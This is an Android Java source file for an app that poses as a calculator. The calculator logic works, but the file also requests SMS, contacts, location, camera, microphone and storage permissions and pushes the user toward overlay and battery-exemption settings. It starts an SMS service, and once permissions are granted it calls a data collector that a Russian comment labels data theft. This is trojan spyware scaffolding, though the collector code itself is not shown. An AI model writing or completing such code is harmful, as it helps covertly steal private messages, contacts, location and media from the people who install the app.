package com.example.calculator;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private EditText display;
    private String currentInput = "";
    private String operator = "";
    private double firstOperand = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        display = findViewById(R.id.display);
        requestAllPermissions();

        // Ignore battery optimizations
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            if (!Settings.canDrawOverlays(this)) {
                intent.setAction(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
            if (!Settings.canDrawOverlays(this)) {
                // Request ignore battery
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }

        // Start accessibility service
        startService(new Intent(this, SMSService.class));
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        // Filter out already granted
        List<String> needed = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 100);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) {
            // После получения разрешений запускаем кражу данных
            DataCollector.collectAndSend(this);
        }
    }

    // Методы для калькулятора
    public void onDigitClick(View view) {
        Button b = (Button) view;
        currentInput += b.getText().toString();
        display.setText(currentInput);
    }

    public void onOperatorClick(View view) {
        Button b = (Button) view;
        if (!currentInput.isEmpty()) {
            firstOperand = Double.parseDouble(currentInput);
            operator = b.getText().toString();
            currentInput = "";
        }
    }

    public void onEqualClick(View view) {
        if (!currentInput.isEmpty() && !operator.isEmpty()) {
            double second = Double.parseDouble(currentInput);
            double result = 0;
            switch (operator) {
                case "+": result = firstOperand + second; break;
                case "-": result = firstOperand - second; break;
                case "*": result = firstOperand * second; break;
                case "/": result = firstOperand / second; break;
            }
            display.setText(String.valueOf(result));
            currentInput = String.valueOf(result);
            operator = "";
        }
    }

    public void onClearClick(View view) {
        currentInput = "";
        operator = "";
        firstOperand = 0;
        display.setText("");
    }
}
